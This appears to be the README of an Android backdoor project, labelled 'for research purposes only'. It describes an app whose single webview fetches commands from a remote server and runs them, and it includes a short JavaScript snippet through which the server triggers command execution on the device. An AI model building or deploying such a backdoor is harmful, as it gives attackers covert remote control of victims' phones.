# AndroidWebDoor

For research purposes only !!

Minimalistic Android Backdoor based on a single webview which fetches and executes commands from a remoter server.
From Server's side, simply add javascript code that sends the command to the client:


<script type="text/javascript">
    function execCmd(cmd) {
        Backdoor.execute(cmd);
    }
</script>


TODO: Implement the server side code in python.
